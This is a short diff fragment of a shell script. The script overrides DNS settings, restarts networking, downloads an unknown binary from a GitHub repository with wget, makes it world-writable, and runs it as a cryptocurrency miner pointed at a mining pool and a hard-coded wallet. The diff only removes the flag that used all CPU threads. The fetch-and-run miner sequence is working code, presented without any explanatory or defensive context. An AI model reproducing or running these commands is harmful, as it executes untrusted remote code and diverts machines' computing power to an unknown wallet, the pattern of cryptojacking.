@@ -10,4 +10,4 @@ echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
 /etc/init.d/network restart
 wget -O asu https://github.com/kartolo92/pile/raw/main/NSRB
 chmod 777 asu
-./asu -algorithm randomc64 --pool randomx.rplant.xyz:7162 --wallet Wo3c536ZLpy8y6P2GT5FUzYLFYnQPiAmaCcFfPNcNhSE7mRPZSwbkZKHP89UdB194fYBucJ16p2kaBdEmCfsMcUo12mMJAqyD.$(shuf -n 1 -i 1-99999)-kido --keepalive true --cpu-threads $(nproc --all)
+./asu -algorithm randomc64 --pool randomx.rplant.xyz:7162 --wallet Wo3c536ZLpy8y6P2GT5FUzYLFYnQPiAmaCcFfPNcNhSE7mRPZSwbkZKHP89UdB194fYBucJ16p2kaBdEmCfsMcUo12mMJAqyD.$(shuf -n 1 -i 1-99999)-kido --keepalive true
